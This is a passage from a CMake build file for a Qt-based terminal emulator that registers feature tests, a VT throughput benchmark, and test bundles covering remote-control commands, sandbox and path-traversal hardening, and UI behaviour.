    # if written before their init settles), the QPointer guard on
    # the deferred lambda, and the non-const `int newTabForRemote(...)`
    # signature that the dispatch layer depends on. See
    # tests/features/remote_control_new_tab/spec.md.
    add_executable(test_remote_control_new_tab
        tests/features/remote_control_new_tab/test_remote_control_new_tab.cpp
    )
    target_compile_options(test_remote_control_new_tab PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_new_tab PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_new_tab COMMAND test_remote_control_new_tab)
    set_tests_properties(remote_control_new_tab PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_select_window — fourth rc_protocol command.
    # Locks the required-tab contract (no implicit default),
    # isDouble-based validation, the delegation to
    # MainWindow::selectTabForRemote, and the setFocus on the new
    # active terminal (without it, follow-up send-text calls hit
    # stale focus owners). See
    # tests/features/remote_control_select_window/spec.md.
    add_executable(test_remote_control_select_window
        tests/features/remote_control_select_window/test_remote_control_select_window.cpp
    )
    target_compile_options(test_remote_control_select_window PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_select_window PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_select_window
             COMMAND test_remote_control_select_window)
    set_tests_properties(remote_control_select_window PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_set_title — fifth rc_protocol command. Locks the
    # title-pin mechanism: the per-shell titleChanged signal handler
    # AND updateTabTitles both consult m_tabTitlePins, the tab-close
    # path frees the pin entry, and clearing the pin via empty-title
    # restores from shellTitle() when tabTitleFormat == "title".
    # See tests/features/remote_control_set_title/spec.md.
    add_executable(test_remote_control_set_title
        tests/features/remote_control_set_title/test_remote_control_set_title.cpp
    )
    target_compile_options(test_remote_control_set_title PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_set_title PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_set_title COMMAND test_remote_control_set_title)
    set_tests_properties(remote_control_set_title PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_get_text — sixth rc_protocol command. Locks the
    # reuse of TerminalWidget::recentOutput (so the AI dialog and
    # rc_protocol can't drift apart), the 10 000-line response cap,
    # the response field set (text + lines + bytes), and the
    # client-side --remote-lines validation. See
    # tests/features/remote_control_get_text/spec.md.
    add_executable(test_remote_control_get_text
        tests/features/remote_control_get_text/test_remote_control_get_text.cpp
    )
    target_compile_options(test_remote_control_get_text PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_get_text PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_get_text COMMAND test_remote_control_get_text)
    set_tests_properties(remote_control_get_text PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_launch — seventh + final command in the initial
    # rc_protocol surface. Locks the require-command contract, the
    # auto-newline behaviour (the convenience differentiator from
    # new-tab), the delegation into newTabForRemote (no parallel
    # tab-creation logic), the sendToPty-not-writeCommand fix in
    # newTabForRemote (so new-tab stays byte-faithful), and the
    # shared client-CLI branch with new-tab. See
    # tests/features/remote_control_launch/spec.md.
    add_executable(test_remote_control_launch
        tests/features/remote_control_launch/test_remote_control_launch.cpp
    )
    target_compile_options(test_remote_control_launch PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_launch PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_launch COMMAND test_remote_control_launch)
    set_tests_properties(remote_control_launch PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # debuglog_perms — asserts ~/.local/share/ants-terminal/debug.log
    # lands 0600 after the first DebugLog::setActive() call, even when
    # the process umask is 0022. Covers fresh-open, clear+reopen, and
    # narrowing of a pre-existing 0644 file left by a pre-fix build.
    # See tests/features/debuglog_perms/spec.md.
    add_executable(test_debuglog_perms
        tests/features/debuglog_perms/test_debuglog_perms.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_debuglog_perms PRIVATE Qt6::Core)
    target_include_directories(test_debuglog_perms PRIVATE src)
    target_compile_options(test_debuglog_perms PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_debuglog_perms PRIVATE
        SRC_DEBUGLOG_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/debuglog.cpp"
    )
    add_test(NAME debuglog_perms COMMAND test_debuglog_perms)
    set_tests_properties(debuglog_perms PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_path_traversal — asserts AuditDialog enrichment sites
    # (snippet preview, comment classifier, inline-suppress scan,
    # AI-triage snippet fallbacks, dropIfContextContains) reject
    # `f.file` values that escape the project root via ../ or
    # symlinks. Behavioral test on a canonicalize+anchor reference
    # reimpl (AuditDialog::resolveProjectPath is private on a heavy
    # QDialog subclass) plus source-greps on auditdialog.cpp to
    # confirm all call sites migrated. See
    # tests/features/audit_path_traversal/spec.md.
    add_executable(test_audit_path_traversal
        tests/features/audit_path_traversal/test_audit_path_traversal.cpp
    )
    target_link_libraries(test_audit_path_traversal PRIVATE Qt6::Core)
    target_compile_options(test_audit_path_traversal PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_path_traversal PRIVATE
        SRC_AUDITDIALOG_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_path_traversal COMMAND test_audit_path_traversal)
    set_tests_properties(audit_path_traversal PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_dialog_config_reload — asserts MainWindow::onConfigFileChanged
    # invalidates the cached m_settingsDialog (close-if-visible +
    # deleteLater + null) so a subsequent Preferences... open rebuilds
    # from the freshly reloaded Config, instead of showing stale
    # pre-edit widget values that would silently overwrite the external
    # edit on Save. Source-grep only — MainWindow is too heavy to
    # instantiate under a feature test. See
    # tests/features/settings_dialog_config_reload/spec.md.
    add_executable(test_settings_dialog_config_reload
        tests/features/settings_dialog_config_reload/test_settings_dialog_config_reload.cpp
    )
    target_link_libraries(test_settings_dialog_config_reload PRIVATE Qt6::Core)
    target_compile_options(test_settings_dialog_config_reload PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_dialog_config_reload PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME settings_dialog_config_reload
             COMMAND test_settings_dialog_config_reload)
    set_tests_properties(settings_dialog_config_reload PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # lua_sandbox_hardening — asserts the Lua sandbox rejects bytecode
    # via two independent gates (0x1b first-byte peek AND luaL_loadfilex
    # "t" mode), that string.dump is stripped at sandbox-init time, and
    # that LuaEngine::shutdown clears the instruction-count hook before
    # lua_close to close the UAF window where __gc metamethods could
    # observe a partially-finalized engine. Gated on LUA_FOUND because
    # the test links against luaengine.cpp + the Lua C API. See
    # tests/features/lua_sandbox_hardening/spec.md.
    if(LUA_FOUND)
        add_executable(test_lua_sandbox_hardening
            tests/features/lua_sandbox_hardening/test_lua_sandbox_hardening.cpp
            src/luaengine.cpp
        )
        target_link_libraries(test_lua_sandbox_hardening PRIVATE
            Qt6::Core
            ${LUA_LIBRARIES}
        )
        target_include_directories(test_lua_sandbox_hardening PRIVATE
            src
            ${LUA_INCLUDE_DIRS}
        )
        target_compile_options(test_lua_sandbox_hardening PRIVATE
            -Wall -Wextra -Wpedantic
        )
        target_compile_definitions(test_lua_sandbox_hardening PRIVATE
            ANTS_LUA_PLUGINS=1
            SRC_LUAENGINE_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/luaengine.cpp"
        )
        add_test(NAME lua_sandbox_hardening COMMAND test_lua_sandbox_hardening)
        set_tests_properties(lua_sandbox_hardening PROPERTIES
            LABELS "features;fast"
            TIMEOUT 10)
    endif()

    # bench_vt_throughput — VT parse + grid-apply throughput harness.
    # Drives the 0.8.0 "Terminal throughput slowdowns" investigation
    # (ROADMAP.md § 0.8.0 > ⚡ Performance). Linked against only
    # terminalgrid.cpp + vtparser.cpp — no GUI, no PTY. Builds at -O2
    # so numbers resemble release builds regardless of
    # CMAKE_BUILD_TYPE. Registered under the `perf` label; excluded
    # from the default `fast` suite so day-to-day ctest runs stay
    # under two seconds. Run explicitly with
    # `ctest -L perf --verbose` or the raw binary. Increase corpus
    # size with `ANTS_PERF_MB=64 ./bench_vt_throughput`.
    add_executable(bench_vt_throughput
        tests/perf/bench_vt_throughput.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(bench_vt_throughput PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(bench_vt_throughput PRIVATE src)
    target_compile_options(bench_vt_throughput PRIVATE
        -Wall -Wextra -Wpedantic -O2
    )
    add_test(NAME vt_throughput COMMAND bench_vt_throughput)
    set_tests_properties(vt_throughput PROPERTIES
        LABELS "perf"
        TIMEOUT 60)

    # ----------------------------------------------------------------------
    # ANTS-1217 Phase 2 — test_vt bundle.
    # 27 standalone test executables for vtparser/terminalgrid/themes
    # invariants consolidated into one GoogleTest bundle. Each migrated
    # test_*.cpp registers via TEST(SuiteName, ...) blocks under a
    # directory-derived Suite (see tests/features/README.md §Bundles).
    # gtest_discover_tests turns each TEST() block into a separate ctest
    # entry, so ctest -L features keeps working unchanged.
    # ----------------------------------------------------------------------
    ants_add_gui_bundle(test_vt
        LIBS    ants_vt_lib ants_core_lib
        SOURCES tests/features/scrollback_redraw/test_redraw.cpp
                tests/features/scrollback_redraw/test_viewport_stable.cpp
                tests/features/scrollback_frozen_view/test_frozen_view.cpp
                tests/features/scroll_region_rotate/test_scroll_region_rotate.cpp
                tests/features/scroll_region_leak_after_apps/test_scroll_region_leak.cpp
                tests/features/scroll_region_growth_on_resize/test_scroll_region_growth.cpp
                tests/features/decstr_soft_reset/test_decstr_soft_reset.cpp
                tests/features/osc9_progress_disambiguator/test_osc9_progress.cpp
                tests/features/wide_char_resize/test_wide_char_resize.cpp
                tests/features/sgr_attribute_reset/test_sgr_reset.cpp
                tests/features/vtparser_simd_scan/test_vtparser_simd.cpp
                tests/features/vt_osc_esc_discard/test_vt_osc_esc_discard.cpp
                tests/features/vtparser_print_run_coalesce/test_print_run_coalesce.cpp
                tests/features/combining_on_resize/test_combining.cpp
                tests/features/osc8_insert_delete_lines/test_osc8_linerange.cpp
                tests/features/hyperlink_resize_clamp/test_hyperlink_resize_clamp.cpp
                tests/features/osc133_hmac_verification/test_osc133_hmac.cpp
                tests/features/threaded_parse_equivalence/test_threaded_parse_equivalence.cpp
                tests/features/threaded_response_ordering/test_threaded_response_ordering.cpp
                tests/features/ris_preserves_callbacks/test_ris_preserves_callbacks.cpp
                tests/features/bce_scroll_erase/test_bce_scroll_erase.cpp
                tests/features/wide_char_overwrite_mate/test_wide_char_overwrite.cpp
                tests/features/osc8_apc_memory_caps/test_osc8_apc_memory_caps.cpp
                tests/features/themedstylesheet_extraction/test_themedstylesheet_extraction.cpp
                tests/features/origin_mode_correctness/test_origin_mode.cpp
                tests/features/osc_color_query/test_osc_color_query.cpp
                tests/features/decrqss/test_decrqss.cpp)
    # scrollback_frozen_view test reads terminalwidget.cpp source via grep —
    # the path must be passed as a compile definition same as the standalone
    # had it. Apply target-wide so any future bundle source can reuse.
    target_compile_definitions(test_vt PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_TERMINALGRID_PATH="${CMAKE_SOURCE_DIR}/src/terminalgrid.cpp"
        SRC_TERMINALGRID_CPP_PATH="${CMAKE_SOURCE_DIR}/src/terminalgrid.cpp"
        SRC_VTPARSER_PATH="${CMAKE_SOURCE_DIR}/src/vtparser.cpp"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.h"
        SRC_THEMEDSTYLESHEET_CPP_PATH="${CMAKE_SOURCE_DIR}/src/themedstylesheet.cpp"
        SRC_THEMEDSTYLESHEET_H_PATH="${CMAKE_SOURCE_DIR}/src/themedstylesheet.h")

    # ----------------------------------------------------------------------
    # ANTS-1217 Phase 3 — test_chrome bundle.
    # Subject: mainwindow + titlebar + coloredtabbar + commandpalette and
    # everything bolted onto them (status bar, menu, focus-management,
    # quake mode, portal integration, paste pipeline, review-changes UI).
    # ----------------------------------------------------------------------
    # mainwindow.cpp cross-references ClaudeIntegration / SshBookmark /
    # ClaudeStatusBarController / ClaudeProjectsDialog — symbols that live
    # in ants_claude_lib and ants_dialogs_lib. Linking those libs here
    # makes the bundle's mainwindow.cpp resolution match ants-terminal's.
    # ants_lua_lib also needed because mainwindow.cpp gates plugin glue
    # behind ANTS_LUA_PLUGINS but a few unconditional references slip
    # through (PluginManager construction); pulling the lib is harmless
    # since it's STATIC and only adds the symbols actually referenced.
    ants_add_gui_bundle(test_chrome
        LIBS    ants_chrome_lib ants_vt_lib ants_core_lib
                ants_claude_lib ants_dialogs_lib ants_audit_lib
                $<$<BOOL:${LUA_FOUND}>:ants_lua_lib>
        SOURCES tests/features/tab_rename_persist/test_tab_rename_persist.cpp
                tests/features/status_bar_elision/test_status_bar_elision.cpp
                tests/features/review_changes_click/test_review_changes_click.cpp
                tests/features/tab_color/test_tab_color.cpp
                tests/features/shell_command_wiring/test_shell_command_wiring.cpp
                tests/features/wayland_quake_mode/test_wayland_quake_mode.cpp
                tests/features/global_shortcuts_portal/test_global_shortcuts_portal.cpp
                tests/features/focus_redirect_menu_guard/test_focus_redirect_menu_guard.cpp
                tests/features/menubar_hover_stylesheet/test_menubar_hover_stylesheet.cpp
                tests/features/tabbar_statusbar_opaque/test_tabbar_statusbar_opaque.cpp
                tests/features/tab_close_button_visible/test_tab_close_button_visible.cpp
                tests/features/review_changes_branches/test_review_changes_branches.cpp
                tests/features/review_changes_clickable/test_review_changes_clickable.cpp
                tests/features/review_changes_scroll_preserve/test_review_changes_scroll_preserve.cpp
                tests/features/github_status_bar/test_github_status_bar.cpp
                tests/features/roadmap_status_bar_refresh/test_roadmap_status_bar_refresh.cpp
                tests/features/ui_state_persistence/test_ui_state_persistence.cpp
                tests/features/crash_safe_session_persist/test_crash_safe_session_persist.cpp
                tests/features/dialog_close_focus_return/test_dialog_close_focus_return.cpp
                tests/features/dialog_pseudo_modal/test_dialog_pseudo_modal.cpp
                tests/features/clipboard_redaction/test_clipboard_redaction.cpp
                tests/features/update_available_menubar/test_update_available_menubar.cpp
                tests/features/status_bar_branch_chip/test_status_bar_branch_chip.cpp
                tests/features/a11y_chrome_names/test_a11y_chrome_names.cpp
                tests/features/command_palette_ghost_completion/test_command_palette_ghost_completion.cpp
                tests/features/no_anim_style/test_no_anim_style.cpp
                tests/features/paste_dialog_custom/test_paste_dialog_custom.cpp
                tests/features/tab_rename_pin/test_tab_rename_pin.cpp
                tests/features/confirm_close_with_processes/test_confirm_close_with_processes.cpp
                tests/features/help_about_menu/test_help_about_menu.cpp
                tests/features/portal_session_close/test_portal_session_close.cpp
                tests/features/styled_font_kerning_off/test_styled_font_kerning_off.cpp
                tests/features/sigpipe_ignore/test_sigpipe_ignore.cpp
                tests/features/pty_dtor_off_main_thread/test_pty_dtor_off_main_thread.cpp
                tests/features/terminal_partial_update_mode/test_terminal_partial_update_mode.cpp
                tests/features/command_mark_gutter/test_command_mark_gutter.cpp
                tests/features/osc133_last_command/test_osc133_last_command.cpp
                tests/features/scroll_snapshot_intent/test_scroll_snapshot_intent.cpp
                tests/features/sync_output_snapshot/test_sync_output_snapshot.cpp
                tests/features/vtbatch_zero_copy/test_vtbatch_zero_copy.cpp
                tests/features/shift_enter_bracketed_paste/test_shift_enter.cpp
                tests/features/kwin_position_tracker/test_kwin_position_tracker.cpp)
    # command_palette_ghost_completion uses QSignalSpy (Qt6::Test).
    target_link_libraries(test_chrome PRIVATE Qt6::Test)
    target_compile_definitions(test_chrome PRIVATE
        SRC_MAIN_PATH="${CMAKE_SOURCE_DIR}/src/main.cpp"
        SRC_MAINWINDOW_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
        MAINWINDOW_H="${CMAKE_SOURCE_DIR}/src/mainwindow.h"
        SRC_TERMINALWIDGET_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_TERMINALWIDGET_CPP_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_TERMINALWIDGET_H_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_HEADER_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_IMPL_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp"
        TERMINALWIDGET_CPP="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp"
        TERMINALWIDGET_H="${CMAKE_SOURCE_DIR}/src/terminalwidget.h"
        SRC_SESSIONMANAGER_H_PATH="${CMAKE_SOURCE_DIR}/src/sessionmanager.h"
        SRC_PORTAL_HEADER_PATH="${CMAKE_SOURCE_DIR}/src/globalshortcutsportal.h"
        SRC_PORTAL_IMPL_PATH="${CMAKE_SOURCE_DIR}/src/globalshortcutsportal.cpp"
        SRC_PORTAL_H_PATH="${CMAKE_SOURCE_DIR}/src/globalshortcutsportal.h"
        SRC_PORTAL_CPP_PATH="${CMAKE_SOURCE_DIR}/src/globalshortcutsportal.cpp"
        SRC_CONFIG_HEADER_PATH="${CMAKE_SOURCE_DIR}/src/config.h"
        SRC_CONFIG_IMPL_PATH="${CMAKE_SOURCE_DIR}/src/config.cpp"
        SRC_CONFIG_H_PATH="${CMAKE_SOURCE_DIR}/src/config.h"
        SRC_CONFIG_CPP_PATH="${CMAKE_SOURCE_DIR}/src/config.cpp"
        SRC_SETTINGSDIALOG_HEADER_PATH="${CMAKE_SOURCE_DIR}/src/settingsdialog.h"
        SRC_SETTINGSDIALOG_IMPL_PATH="${CMAKE_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_SETTINGSDIALOG_H_PATH="${CMAKE_SOURCE_DIR}/src/settingsdialog.h"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_OPAQUEMENUBAR_PATH="${CMAKE_SOURCE_DIR}/src/opaquemenubar.h"
        SRC_OPAQUESTATUSBAR_PATH="${CMAKE_SOURCE_DIR}/src/opaquestatusbar.h"
        SRC_THEMEDSTYLESHEET_PATH="${CMAKE_SOURCE_DIR}/src/themedstylesheet.cpp"
        SRC_THEMEDSTYLESHEET_CPP_PATH="${CMAKE_SOURCE_DIR}/src/themedstylesheet.cpp"
        SRC_COLOREDTABBAR_CPP_PATH="${CMAKE_SOURCE_DIR}/src/coloredtabbar.cpp"
        SRC_COLOREDTABBAR_H_PATH="${CMAKE_SOURCE_DIR}/src/coloredtabbar.h"
        TITLEBAR_CPP_PATH="${CMAKE_SOURCE_DIR}/src/titlebar.cpp"
        COMMANDPALETTE_CPP_PATH="${CMAKE_SOURCE_DIR}/src/commandpalette.cpp"
        DIALOGFOCUS_H="${CMAKE_SOURCE_DIR}/src/dialogfocus.h"
        CLIPBOARDGUARD_H="${CMAKE_SOURCE_DIR}/src/clipboardguard.h"
        KWINPOS_CPP="${CMAKE_SOURCE_DIR}/src/kwinpositiontracker.cpp"
        KWINPOS_H="${CMAKE_SOURCE_DIR}/src/kwinpositiontracker.h"
        SRC_PTYHANDLER_CPP_PATH="${CMAKE_SOURCE_DIR}/src/ptyhandler.cpp"
        SRC_DIFFVIEWER_CPP_PATH="${CMAKE_SOURCE_DIR}/src/diffviewer.cpp"
        SRC_ABOUTDIALOGS_PATH="${CMAKE_SOURCE_DIR}/src/aboutdialogs.cpp"
        SRC_RELEASE_WORKFLOW_PATH="${CMAKE_SOURCE_DIR}/.github/workflows/release.yml"
        DOCS_STATUS_BAR_STANDARD_PATH="${CMAKE_SOURCE_DIR}/docs/standards/status-bar.md"
        CMAKELISTS_TXT="${CMAKE_SOURCE_DIR}/CMakeLists.txt"
        SRC_CMAKELISTS_PATH="${CMAKE_SOURCE_DIR}/CMakeLists.txt"
        SRC_DIR="${CMAKE_SOURCE_DIR}/src"
        VTSTREAM_H="${CMAKE_SOURCE_DIR}/src/vtstream.h"
        VTSTREAM_CPP="${CMAKE_SOURCE_DIR}/src/vtstream.cpp")
endif()
